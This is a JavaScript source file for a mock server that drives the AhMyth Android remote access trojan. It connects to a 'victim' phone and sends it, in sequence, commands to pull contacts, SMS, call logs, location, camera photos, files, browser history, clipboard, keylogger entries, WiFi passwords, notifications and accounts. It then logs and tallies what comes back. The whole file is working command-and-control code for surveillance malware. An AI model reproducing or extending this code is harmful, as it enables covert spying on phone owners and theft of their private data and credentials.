/**
 * AhMyth Mock Server - Tests ALL RAT functions
 * This server pretends to be the AhMyth server and sends commands to the phone
 */

const http = require('http');
const socketIo = require('socket.io');

const PORT = 1234;

// All commands to test
const COMMANDS = [
    { order: 'x0000di', name: 'Device Info' },
    { order: 'x0000cn', name: 'Contacts' },
    { order: 'x0000cl', name: 'Call Logs' },
    { order: 'x0000sm', extra: 'ls', name: 'SMS List' },
    { order: 'x0000lm', name: 'Location' },
    { order: 'x0000ca', extra: '0', name: 'Camera Front' },
    { order: 'x0000ca', extra: '1', name: 'Camera Back' },
    { order: 'x0000fm', extra: 'ls', path: '/storage/emulated/0/', name: 'File Manager' },  // Fixed: extra='ls', path=path
    { order: 'x0000ap', name: 'App List' },  // List all apps
    { order: 'x0000bh', name: 'Browser History' },
    { order: 'x0000cb', extra: 'get', name: 'Clipboard' },  // 'get'=get current, 'start'=watch, 'stop'=stop watching
    { order: 'x0000kl', name: 'Keylogger' },
    { order: 'x0000wp', name: 'WiFi Passwords' },
    { order: 'x0000rp', permission: 'all', name: 'Request Permissions' },
    { order: 'x0000bt', name: 'Battery Info' },
    { order: 'x0000ns', name: 'Notifications' },
    { order: 'x0000ac', name: 'Accounts' },
];

let testIndex = 0;
let results = [];
let victimSocket = null;

console.log('╔══════════════════════════════════════════════════════════════╗');
console.log('║        AhMyth MOCK SERVER - Function Tester                  ║');
console.log('╚══════════════════════════════════════════════════════════════╝\n');

// Create HTTP server
const server = http.createServer();

// Create Socket.IO server
const io = socketIo(server, {
    cors: { origin: '*' },
    pingTimeout: 60000,
    pingInterval: 25000
});

server.listen(PORT, () => {
    console.log(`[✓] Mock server listening on port ${PORT}`);
    console.log('[i] Waiting for phone to connect...\n');
});

io.on('connection', (socket) => {
    const query = socket.handshake.query;
    
    console.log('═══════════════════════════════════════════════════════════════');
    console.log('[✓] PHONE CONNECTED!');
    console.log(`    Model: ${query.model}`);
    console.log(`    Manufacturer: ${query.manf}`);
    console.log(`    Android: ${query.release}`);
    console.log(`    Device ID: ${query.id}`);
    console.log(`    Battery: ${query.battery}%`);
    console.log(`    Operator: ${query.operator}`);
    console.log('═══════════════════════════════════════════════════════════════\n');
    
    victimSocket = socket;
    
    // Set up listeners for all responses
    COMMANDS.forEach(cmd => {
        socket.on(cmd.order, (data) => {
            handleResponse(cmd, data);
        });
    });
    
    // Start testing after 2 seconds
    setTimeout(() => {
        console.log('╔══════════════════════════════════════════════════════════════╗');
        console.log('║              STARTING ALL FUNCTION TESTS                     ║');
        console.log('╚══════════════════════════════════════════════════════════════╝\n');
        runNextTest();
    }, 2000);
    
    socket.on('disconnect', () => {
        console.log('\n[!] Phone disconnected');
        printResults();
    });
});

function runNextTest() {
    if (testIndex >= COMMANDS.length) {
        console.log('\n[✓] All tests completed!\n');
        printResults();
        return;
    }
    
    const cmd = COMMANDS[testIndex];
    console.log(`\n[TEST ${testIndex + 1}/${COMMANDS.length}] ${cmd.name}`);
    console.log(`    → Sending: ${cmd.order}${cmd.extra ? ' (extra: ' + cmd.extra + ')' : ''}`);
    
    const startTime = Date.now();
    results[testIndex] = { 
        name: cmd.name, 
        order: cmd.order,
        startTime: startTime,
        status: 'PENDING'
    };
    
    // Send the command
    const payload = { order: cmd.order };
    if (cmd.extra) payload.extra = cmd.extra;
    if (cmd.path) payload.path = cmd.path;
    if (cmd.permission) payload.permission = cmd.permission;
    
    victimSocket.emit('order', payload);
    
    // Camera commands need longer timeout (autofocus, processing)
    const isCamera = cmd.order === 'x0000ca';
    const timeout = isCamera ? 25000 : 10000;
    
    // Timeout
    const currentIdx = testIndex;
    setTimeout(() => {
        if (results[currentIdx] && results[currentIdx].status === 'PENDING') {
            results[currentIdx].status = 'TIMEOUT';
            results[currentIdx].duration = timeout;
            console.log(`    ← [✗] TIMEOUT (${timeout/1000}s)`);
            testIndex++;
            runNextTest();
        }
    }, timeout);
}

function handleResponse(cmd, data) {
    const idx = COMMANDS.findIndex(c => c.order === cmd.order);
    if (idx === -1 || idx !== testIndex) return;
    
    const duration = Date.now() - results[idx].startTime;
    const dataStr = JSON.stringify(data);
    const size = dataStr.length;
    
    results[idx].duration = duration;
    results[idx].size = size;
    
    // Determine status
    if (data && data.error) {
        results[idx].status = 'ERROR';
        results[idx].info = data.error.substring(0, 50);
        console.log(`    ← [✗] ERROR: ${data.error.substring(0, 60)}`);
    } else if (data && data.image === false) {
        results[idx].status = 'FAILED';
        results[idx].info = data.error || 'Camera failed';
        console.log(`    ← [✗] FAILED: ${data.error || 'No image'}`);
    } else if (Array.isArray(data) && data.length === 0) {
        results[idx].status = 'EMPTY';
        console.log(`    ← [○] EMPTY (0 items)`);
    } else if (data && typeof data === 'object') {
        if (data.image && data.image !== false) {
            results[idx].status = 'SUCCESS';
            console.log(`    ← [✓] SUCCESS - Image received (${size} bytes)`);
        } else if (data.history !== undefined) {
            results[idx].status = data.history.length > 0 ? 'SUCCESS' : 'EMPTY';
            console.log(`    ← [${data.history.length > 0 ? '✓' : '○'}] ${data.history.length} history items`);
        } else if (data.logs !== undefined) {
            results[idx].status = 'SUCCESS';
            console.log(`    ← [✓] ${data.logs.length} keylog entries, enabled: ${data.enabled}`);
        } else {
            results[idx].status = 'SUCCESS';
            console.log(`    ← [✓] SUCCESS (${size} bytes, ${duration}ms)`);
        }
    } else if (Array.isArray(data)) {
        results[idx].status = 'SUCCESS';
        console.log(`    ← [✓] SUCCESS - ${data.length} items (${size} bytes)`);
    } else {
        results[idx].status = 'SUCCESS';
        console.log(`    ← [✓] SUCCESS (${size} bytes)`);
    }
    
    // Show preview of data
    if (size < 500) {
        console.log(`    Data: ${dataStr.substring(0, 200)}${dataStr.length > 200 ? '...' : ''}`);
    }
    
    testIndex++;
    setTimeout(runNextTest, 1500);
}

function printResults() {
    console.log('\n');
    console.log('╔══════════════════════════════════════════════════════════════════════╗');
    console.log('║                         TEST RESULTS                                 ║');
    console.log('╠══════════════════════════════════════════════════════════════════════╣');
    
    let success = 0, failed = 0, empty = 0, timeout = 0, error = 0;
    
    results.forEach((r, i) => {
        if (!r) return;
        const icon = r.status === 'SUCCESS' ? '✓' : 
                     r.status === 'EMPTY' ? '○' : 
                     r.status === 'TIMEOUT' ? '⏱' : '✗';
        const dur = r.duration ? `${r.duration}ms` : '---';
        const sz = r.size ? `${r.size}b` : '---';
        console.log(`║ [${icon}] ${(i+1).toString().padStart(2)}. ${r.name.padEnd(20)} ${r.status.padEnd(8)} ${dur.padStart(8)} ${sz.padStart(8)} ║`);
        
        if (r.status === 'SUCCESS') success++;
        else if (r.status === 'EMPTY') empty++;
        else if (r.status === 'TIMEOUT') timeout++;
        else if (r.status === 'ERROR') error++;
        else failed++;
    });
    
    console.log('╠══════════════════════════════════════════════════════════════════════╣');
    console.log(`║ ✓ SUCCESS: ${success}  | ○ EMPTY: ${empty}  | ✗ FAILED: ${failed}  | ⏱ TIMEOUT: ${timeout}  | ERROR: ${error}`.padEnd(71) + '║');
    console.log('╚══════════════════════════════════════════════════════════════════════╝');
    
    setTimeout(() => process.exit(0), 3000);
}

// Handle Ctrl+C
process.on('SIGINT', () => {
    console.log('\n[!] Interrupted');
    printResults();
});

